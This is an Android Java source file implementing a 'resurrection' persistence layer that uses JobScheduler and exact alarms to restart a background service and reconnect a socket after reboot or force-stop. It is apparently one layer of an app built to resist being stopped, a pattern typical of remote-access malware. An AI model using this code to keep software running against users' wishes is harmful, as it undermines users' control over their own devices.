package com.fason.app.persistence;

import android.app.job.JobInfo;
import android.app.job.JobParameters;
import android.app.job.JobScheduler;
import android.app.job.JobService;
import android.content.ComponentName;
import android.content.Context;
import android.os.Build;
import android.util.Log;
import com.fason.app.core.FasonApp;
import com.fason.app.core.network.SocketClient;
import com.fason.app.service.MainService;

/**
 * Layer 2: JobScheduler Persistence
 * setPersisted(true) means the job survives reboot AND force-stop.
 * The system owns the schedule — we just respond to triggers.
 */
public final class PersistenceJobService extends JobService {
    private static final String TAG = "PersistenceJob";
    public static final int JOB_ID_RESURRECT = 0xFA50;
    private static final long INTERVAL_MS = 15 * 60 * 1000L; // 15 minutes
    private static final long MIN_INTERVAL_MS = JobInfo.getMinPeriodMillis();

    @Override
    public boolean onStartJob(JobParameters params) {
        Log.i(TAG, "Job triggered — running resurrection check");

        new Thread(() -> {
            try {
                resurrect();
            } catch (Exception e) {
                Log.e(TAG, "Resurrection failed", e);
            } finally {
                jobFinished(params, false);
            }
        }).start();

        return true; // Work is async
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        Log.w(TAG, "Job stopped by system — rescheduling");
        schedule(getApplicationContext());
        return true; // Reschedule
    }

    private void resurrect() {
        Context ctx = getApplicationContext();

        // Check if service is alive
        if (MainService.getInstance() == null) {
            try {
                android.content.Intent intent = new android.content.Intent(ctx, MainService.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ctx.startForegroundService(intent);
                } else {
                    ctx.startService(intent);
                }
                Log.i(TAG, "Service resurrected from job");
            } catch (Exception e) {
                Log.w(TAG, "Direct start failed, trying alarm", e);
                scheduleImmediateAlarm(ctx);
            }
        }

        // Check socket health
        try {
            SocketClient client = SocketClient.getInstance();
            if (client != null && !client.isConnected()) {
                client.reconnect();
            }
        } catch (Exception ignored) {}
    }

    private void scheduleImmediateAlarm(Context ctx) {
        android.app.AlarmManager am = (android.app.AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;

        android.content.Intent intent = new android.content.Intent(ctx, com.fason.app.receiver.WatchdogReceiver.class);
        intent.setAction(com.fason.app.core.Protocol.BC_RESPAWN_SERVICE);
        android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(
            ctx, 0, intent,
            android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_IMMUTABLE
        );

        long triggerAt = System.currentTimeMillis() + 5000;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            am.setExactAndAllowWhileIdle(android.app.AlarmManager.RTC_WAKEUP, triggerAt, pi);
        } else {
            am.setExact(android.app.AlarmManager.RTC_WAKEUP, triggerAt, pi);
        }
    }

    public static void schedule(Context ctx) {
        try {
            JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (js == null) return;

            ComponentName component = new ComponentName(ctx, PersistenceJobService.class);

            long interval = Math.max(INTERVAL_MS, MIN_INTERVAL_MS);

            JobInfo.Builder builder = new JobInfo.Builder(JOB_ID_RESURRECT, component)
                .setPersisted(true)           // Survives reboot + force-stop
                .setPeriodic(interval)
                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                .setBackoffCriteria(30_000L, JobInfo.BACKOFF_POLICY_EXPONENTIAL)
                .setRequiresCharging(false)
                .setRequiresDeviceIdle(false);

            int result = js.schedule(builder.build());
            if (result == JobScheduler.RESULT_SUCCESS) {
                Log.i(TAG, "Persistence job scheduled, interval: " + interval + "ms");
            } else {
                Log.e(TAG, "Job scheduling failed");
            }
        } catch (Exception e) {
            Log.e(TAG, "Schedule error", e);
        }
    }

    public static void cancel(Context ctx) {
        try {
            JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (js != null) js.cancel(JOB_ID_RESURRECT);
        } catch (Exception ignored) {}
    }

    public static boolean isScheduled(Context ctx) {
        try {
            JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (js == null) return false;
            for (JobInfo job : js.getAllPendingJobs()) {
                if (job.getId() == JOB_ID_RESURRECT) return true;
            }
        } catch (Exception ignored) {}
        return false;
    }
}
